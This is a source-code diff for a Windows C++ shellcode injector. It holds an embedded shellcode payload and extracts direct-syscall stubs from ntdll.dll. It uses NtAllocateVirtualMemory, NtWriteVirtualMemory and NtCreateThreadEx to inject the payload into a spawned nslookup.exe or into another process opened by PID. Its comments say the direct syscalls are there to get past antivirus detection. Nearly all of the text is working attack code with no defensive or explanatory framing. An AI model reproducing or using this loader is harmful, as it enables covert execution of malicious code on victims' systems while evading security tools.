@@ -1,6 +1,8 @@
 #include <iostream>
 #include "Windows.h"
 #include "winternl.h"
+#include "getSyscall.h"
+#include <fstream>
 #pragma comment(lib, "ntdll")
 
 /*
@@ -46,7 +48,6 @@ unsigned char shellcode[] =
 "\xc2\xcd\x1f\xf3\x3f\x7b\xb2\x05\xdb\x3f\x8b\x79\x4a\x27\x48"
 "\xcb\x12\xb2\x31\x13\x4a\x7e\x09";
 
-int const SYSCALL_STUB_SIZE = 23;
 using myNtCreateFile = NTSTATUS(NTAPI*)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
 
 using myNtAllocateVirutalMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PULONG RegionSize, ULONG AllocationType, ULONG Protect);
@@ -55,43 +56,18 @@ using myNtWriteVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, LPVOID Bas
 
 using myNtCreateThreadEx = NTSTATUS(NTAPI*)(PHANDLE hThread, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID lpStartAddress, PVOID lpParameter, ULONG Flags, SIZE_T ZeroBits, SIZE_T SizeOfStackCommit, SIZE_T SizeOfStackReserve, PVOID lpBytesBuffer);
 
-PVOID RVAtoRawOffset(DWORD_PTR RVA, PIMAGE_SECTION_HEADER section)
-{
-	return (PVOID)(RVA - section->VirtualAddress + section->PointerToRawData);
-}
-
-BOOL GetSyscallStub(LPCSTR functionName, PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection, LPVOID syscallStub)
-{
-	PDWORD addressOfNames = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfNames), rdataSection);
-	PDWORD addressOfFunctions = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfFunctions), rdataSection);
-	BOOL stubFound = FALSE;
-
-	for (size_t i = 0; i < exportDirectory->NumberOfNames; i++)
-	{
-		DWORD_PTR functionNameVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfNames[i], rdataSection);
-		DWORD_PTR functionVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfFunctions[i + 1], textSection);
-		LPCSTR functionNameResolved = (LPCSTR)functionNameVA;
-		if (std::strcmp(functionNameResolved, functionName) == 0)
-		{
-			std::memcpy(syscallStub, (LPVOID)functionVA, SYSCALL_STUB_SIZE);
-			stubFound = TRUE;
-		}
-	}
-
-	return stubFound;
-}
-
 int main(int argc, char* argv[]) {
+
+	/* RICARDO PUT YOUR CODE HERE */
+
+
+	/* RICARDO DON'T PUT YOUR CODE AFTER THIS LINE */
+
 	char syscallStub[SYSCALL_STUB_SIZE] = {};
 	char syscallStub2[SYSCALL_STUB_SIZE] = {};
 	char syscallStub3[SYSCALL_STUB_SIZE] = {};
 	char syscallStub4[SYSCALL_STUB_SIZE] = {};
-	SIZE_T bytesWritten = 0;
 	DWORD oldProtection = 0;
-	HANDLE file = NULL;
-	DWORD fileSize = NULL;
-	DWORD bytesRead = NULL;
-	LPVOID fileData = NULL;
 
 	// variables for NtCreateFile
 	OBJECT_ATTRIBUTES oa;
@@ -127,39 +103,12 @@ int main(int argc, char* argv[]) {
 	myNtCreateThreadEx NtCreateThreadEx = (myNtCreateThreadEx)(LPVOID)syscallStub4;
 	VirtualProtect(syscallStub4, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
 
-	file = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-	fileSize = GetFileSize(file, NULL);
-	fileData = HeapAlloc(GetProcessHeap(), 0, fileSize);
-	ReadFile(file, fileData, fileSize, &bytesRead, NULL);
-
-	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileData;
-	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileData + dosHeader->e_lfanew);
-	DWORD exportDirRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
-	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(imageNTHeaders);
-	PIMAGE_SECTION_HEADER textSection = section;
-	PIMAGE_SECTION_HEADER rdataSection = section;
-
-	for (int i = 0; i < imageNTHeaders->FileHeader.NumberOfSections; i++)
-	{
-		if (std::strcmp((CHAR*)section->Name, (CHAR*)".rdata") == 0) {
-			rdataSection = section;
-			break;
-		}
-		section++;
-	}
-
-	PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)RVAtoRawOffset((DWORD_PTR)fileData + exportDirRVA, rdataSection);
-
-	GetSyscallStub("NtCreateFile", exportDirectory, fileData, textSection, rdataSection, syscallStub);
-	GetSyscallStub("NtAllocateVirtualMemory", exportDirectory, fileData, textSection, rdataSection, syscallStub2);
-	GetSyscallStub("NtWriteVirtualMemory", exportDirectory, fileData, textSection, rdataSection, syscallStub3);
-	GetSyscallStub("NtCreateThreadEx", exportDirectory, fileData, textSection, rdataSection, syscallStub4);
-	//NtCreateFile(&fileHandle, FILE_GENERIC_WRITE, &oa, &osb, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
-	//NtAllocateVirtualMemory(&processHandle, &allocation_start, 0, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	//NtWriteVirtualMemory(&processHandle, &allocation_start, (PVOID *)shellcode, sizeof(shellcode), 0);
-	//NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, &processHandle, allocation_start, allocation_start, FALSE, NULL, NULL, NULL, NULL);
+	GetSyscallStub("NtCreateFile", syscallStub);
+	GetSyscallStub("NtAllocateVirtualMemory", syscallStub2);
+	GetSyscallStub("NtWriteVirtualMemory", syscallStub3);
+	GetSyscallStub("NtCreateThreadEx", syscallStub4);
 	
-	/* The below code starts the process nslookup.exe so it can inject above shellcode into it. Look for ways to inject into already running process by grabbing the process handle */
+	/* The below code starts the process nslookup.exe so we can inject above shellcode into it. */
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
 	LPCWSTR cmd;
@@ -187,8 +136,14 @@ int main(int argc, char* argv[]) {
 	}
 	WaitForSingleObject(pi.hProcess, 1000); // Allow nslookup 1 second to start/initialize.
 
+
+
+	/* creates file using direct syscall. only here for testing and referncing, not actually useful and will be deleted soon */
+
+	//NtCreateFile(&fileHandle, FILE_GENERIC_WRITE, &oa, &osb, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
 	
-											
+	
+
 	/* this code will inject into remote process that we did create (nslookup.exe from above) using high level API functions (just for testing, will get detected by AV)*/
 	
 	//allocation_start = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -206,10 +161,10 @@ int main(int argc, char* argv[]) {
 	
 	
 	
-	/* this code will inject into a remote process that we didnt start given PID */
+	/* this code will inject into a remote process that we didnt start given PID using direct syscalls*/
 	
 	HANDLE procHandle;
-	procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 11108);
+	procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 10904);
 
 	allocation_start = nullptr;
 	NtAllocateVirtualMemory(procHandle, &allocation_start, 0, (PULONG)&RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
